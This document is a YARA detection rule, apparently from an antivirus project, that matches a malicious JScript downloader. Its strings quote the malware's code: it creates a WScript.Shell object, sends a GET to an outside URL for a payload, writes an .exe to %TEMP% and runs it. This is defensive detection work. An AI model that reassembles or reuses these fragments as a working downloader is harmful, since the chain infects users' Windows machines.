rule sig_20160328_314452dacba3c6de416ba8dbda46b903 {
  meta:
    description = "datamaliciousorder - file 20160328_314452dacba3c6de416ba8dbda46b903.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6306dc435101bd94d696c4472ca49226902d081c7ce4ab3671f9c610c02a33b0"

  strings:
    $s1  = "function Ldtujb() {return Akpnanwpqe[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"zcPRzbpMYeYWW1.exe\";};" fullword ascii
    $s2  = "do {WScript[Ptrzctxyy](Eagxndj() * 11)} while (Nqyzjaxzwo[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Akpnanwpqe = function Bgfkgfjupp() {return WScript[Jcqrg](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Nqyzjaxzwo[Ehqrdgyb](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s5  = "function Kmeryjx(Kcmnxf, Hrahh){return Kcmnxf - Hrahh;};" fullword ascii
    $s6  = "function Egcmdlrtfm(Hxvrrm){Akpnanwpqe[\"Run\"](Hxvrrm, Wedxjfh, Wedxjfh);};" fullword ascii
    $s7  = "function Hsplydr() {return ((Jyuicz == true) && (Jyuicz == Tydnf)) ? 1 : Wedxjfh;};" fullword ascii
    $s8  = "function Eagxndj(){return 22;};" fullword ascii
    $s9  = "var Tydnf = false;" fullword ascii
    $s10 = "var Jyuicz = false;" fullword ascii
    $s11 = "var Ykffmgz = false;" fullword ascii
    $s12 = "Tydnf = true; " fullword ascii
    $s13 = "Jyuicz = true; " fullword ascii
    $s14 = "function Scxptm(Tqtjyn) {var Zfkwtqd = (1, 2, 3, 4, 5, Tqtjyn); return Zfkwtqd;};" fullword ascii
    $s15 = "function Uwnefkohev(){return Huvoo;};" fullword ascii
    $s16 = "function Raukdofue(){return Jcqrg;};" fullword ascii
    $s17 = "var Zwatxy = new this[\"Date\"]();" fullword ascii
    $s18 = " while (Tjjay){" fullword ascii
    $s19 = "return Kmeryjx(Dsmydwzuvp, Ifrarffs);" fullword ascii
    $s20 = "function Cavynvf()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}